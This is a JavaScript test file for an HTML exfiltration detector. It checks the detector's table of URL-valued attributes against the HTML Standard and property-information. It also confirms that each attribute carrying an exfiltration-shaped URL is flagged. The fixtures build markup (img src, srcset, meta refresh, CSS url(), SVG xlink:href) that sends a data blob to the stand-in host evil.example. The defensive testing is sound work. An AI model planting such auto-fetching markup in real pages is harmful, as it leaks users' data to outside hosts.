/**
 * `URL_ATTRIBUTES` is the one table Layer 3 reads element URLs through, so a
 * URL attribute missing from it is a URL no detector sees. This suite holds it
 * to two outside references:
 *
 *  - the HTML Standard's URL-valued attributes (its attribute index plus the
 *    obsolete-features chapter, and SVG's `href`/`xlink:href`), which the table
 *    and an exempt list must PARTITION — a URL attribute is either read or left
 *    out for a stated reason, never forgotten;
 *  - property-information, the attribute knowledge hast-util-from-parse5 builds
 *    this package's trees with, which must spell each entry's hast property the
 *    way the table does — a misspelt property reads `undefined` on every
 *    element and silently drops the attribute.
 *
 * Every row is then driven end to end: an exfil-shaped URL in it is reported,
 * a plain one is not.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { realpathSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";

import { URL_ATTRIBUTES } from "../src/url-attributes.mjs";
import { detectExfil } from "../src/html.mjs";

// property-information is not a direct dependency: it is read through the
// hast-util-from-parse5 that depends on it, which is exactly the copy that
// names the properties of every tree this package parses.
const fromParse5 = realpathSync(
  fileURLToPath(import.meta.resolve("hast-util-from-parse5")),
);
const propertyInformation = await import(
  pathToFileURL(createRequire(fromParse5).resolve("property-information")).href
);

// The URL-valued attributes of the HTML Standard: every attribute whose value
// its index (§ "Attributes") gives as a URL, URL list or image-candidate list,
// the obsolete URL attributes of § 16, the declarative-refresh `content`, the
// `style` attribute's CSS, and SVG 2's `href` with its `xlink:href` legacy.
const SPEC_URL_ATTRIBUTES = `action archive background cite classid codebase
  content data datasrc dynsrc formaction href imagesrcset itemid itemtype
  longdesc lowsrc manifest ping poster profile src srcset style
  xlink:href`.split(/\s+/);

// URL-valued attributes the table deliberately does not read, each because no
// current browser dereferences the URL it holds.
const EXEMPT = {
  archive: "`<object archive>` named Java applet archives; plugins are gone",
  classid: "`<object classid>` named a plugin, never fetched by a browser now",
  codebase: "`<object codebase>` only resolved the removed plugin loading",
  datasrc: "IE data binding, never implemented elsewhere",
  dynsrc: "IE-only video source, never implemented elsewhere",
  itemid: "a microdata identifier: a name, never dereferenced",
  itemtype: "a microdata vocabulary identifier, never dereferenced",
  lowsrc: "Netscape low-resolution preview, removed from every browser",
  manifest: "Application Cache, removed from every browser",
  profile: "`<head profile>` named metadata profiles, never fetched",
};

const tableAttributes = URL_ATTRIBUTES.map((entry) => entry.attribute);

describe("URL_ATTRIBUTES partitions the spec's URL attributes", () => {
  it("names each attribute once", () =>
    assert.equal(new Set(tableAttributes).size, tableAttributes.length));

  it("every spec URL attribute is read or exempt, and not both", () => {
    for (const attribute of SPEC_URL_ATTRIBUTES) {
      const read = tableAttributes.includes(attribute);
      const exempt = Object.hasOwn(EXEMPT, attribute);
      assert.ok(read !== exempt, `${attribute}: read=${read} exempt=${exempt}`);
    }
  });

  it("the table and the exempt list hold nothing outside the spec list", () =>
    assert.deepEqual(
      [...tableAttributes, ...Object.keys(EXEMPT)]
        .filter((attribute) => !SPEC_URL_ATTRIBUTES.includes(attribute))
        .sort(),
      [],
    ));
});

describe("URL_ATTRIBUTES spells each hast property as the tree builder does", () => {
  for (const entry of URL_ATTRIBUTES)
    it(entry.attribute, () => {
      const { html, svg, find } = propertyInformation;
      const known = [find(html, entry.attribute), find(svg, entry.attribute)]
        .filter((info) => info.defined)
        .map((info) => info.property);
      assert.ok(
        known.length > 0,
        `${entry.attribute} is not a known attribute`,
      );
      for (const property of known) assert.equal(property, entry.property);
    });
});

const BLOB = "A".repeat(48);
const EVIL = `https://evil.example/c?d=${BLOB}`;
const PLAIN = "https://example.com/page";

/**
 * An element the attribute is URL-valued on.
 * @param {(typeof URL_ATTRIBUTES)[number]} entry
 */
function elementFor(entry) {
  if (entry.attribute === "xlink:href") return "image";
  return entry.elements?.[0] ?? (entry.attribute === "href" ? "link" : "img");
}

/**
 * Markup putting `url` in the attribute, on an element it is URL-valued on.
 * @param {(typeof URL_ATTRIBUTES)[number]} entry
 * @param {string} url
 */
function markup(entry, url) {
  const tag = elementFor(entry);
  const value = {
    url,
    urls: url,
    srcset: `${url} 2x`,
    refresh: `0; url=${url}`,
    css: `background:url(${url})`,
  }[entry.grammar];
  const extra = entry.grammar === "refresh" ? ' http-equiv="refresh"' : "";
  if (entry.attribute === "xlink:href")
    return `<svg><image ${entry.attribute}="${value}"/></svg>`;
  return `<${tag}${extra} ${entry.attribute}="${value}"></${tag}>`;
}

describe("every URL_ATTRIBUTES row is read end to end", () => {
  for (const entry of URL_ATTRIBUTES) {
    it(`${entry.attribute}: an exfil-shaped URL is reported`, () => {
      const threats = detectExfil(markup(entry, EVIL));
      assert.ok(threats, markup(entry, EVIL));
      assert.equal(threats.length, 1);
      assert.equal(threats[0].target, "evil.example");
      assert.equal(threats[0].reason, "suspicious query parameter");
      assert.equal(
        threats[0].autoFetched,
        entry.fetched && !entry.notFetchedOn.includes(elementFor(entry)),
      );
    });
    // A form or refresh target off the page's origin is reported by design.
    if (entry.context === "resource")
      it(`${entry.attribute}: a plain URL is not`, () =>
        assert.equal(detectExfil(markup(entry, PLAIN)), null));
  }
});

// Pinned here rather than read from the table's `notFetchedOn`, so dropping a
// tag from it fails: each is a link target that waits to be followed.
describe("a link target is reported, but not auto-fetched", () => {
  for (const [attribute, tag] of [
    ["href", "a"],
    ["href", "area"],
    ["href", "base"],
    ["xlink:href", "a"],
  ])
    it(`${attribute} on <${tag}>`, () => {
      const inner = `<${tag} ${attribute}="${EVIL}"></${tag}>`;
      const threats = detectExfil(
        attribute === "xlink:href" ? `<svg>${inner}</svg>` : inner,
      );
      assert.deepEqual(
        (threats ?? []).map((threat) => threat.autoFetched),
        [false],
      );
    });
});
